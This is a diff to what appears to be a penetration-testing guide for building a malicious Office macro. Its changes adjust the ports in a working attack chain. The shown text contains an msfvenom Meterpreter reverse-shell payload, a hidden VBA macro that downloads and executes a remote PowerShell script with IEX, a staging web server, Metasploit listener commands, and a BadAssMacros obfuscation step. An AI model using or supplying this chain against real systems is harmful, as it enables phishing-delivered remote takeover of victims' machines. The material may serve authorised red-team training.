@@ -171,14 +171,14 @@ $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint
 
 Substitute the `[Byte[]] $buf = 0x0,0x0,0x0,0x0,0x0,0x0...` with the output from the following:
 ```bash
-msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.1 LPORT=443 EXITFUNC=thread -f ps1
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=80 EXITFUNC=thread -f ps1
 ```
 
 Finally, our macro should look like so. Very similar to the original, but a slight variant to give us more versions of the VBA to experiment with should the exploit not work for any reason.
 ```vba
 Sub MyMacro()
     Dim str As String
-    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.0.1/run.ps1') | IEX"
+    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.0.1:81/run.ps1') | IEX"
     Shell str, vbHide
 End Sub
 
@@ -193,7 +193,7 @@ End Sub
 
 Before executing, don't forget to start the web server:
 ```bash
-python3 -m http.server 80
+python3 -m http.server 81
 ```
 and also don't forget to get the staged meterpreter listener ready:
 ```bash
@@ -203,13 +203,13 @@ sudo msfconsole -q
 use multi/handler
 ```
 ```bash
-set payload windows/x64/meterpreter/reverse_https
+set payload windows/meterpreter/reverse_tcp
 ```
 ```bash
 set lhost 192.168.0.1
 ```
 ```bash
-set lport 443
+set lport 80
 ```
 ```bash
 exploit
@@ -224,6 +224,9 @@ The following command provides some sane defaults that will generate the raw tex
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.x.y LPORT=80 EXITFUNC=thread -f raw > shellcode.bin
 ```
+```bash
+```
+
 ```powershell
 .\BadAssMacrosx86.exe -i shellcode.bin -w doc -p no -s indirect -c 10 -o macro.txt
 ```
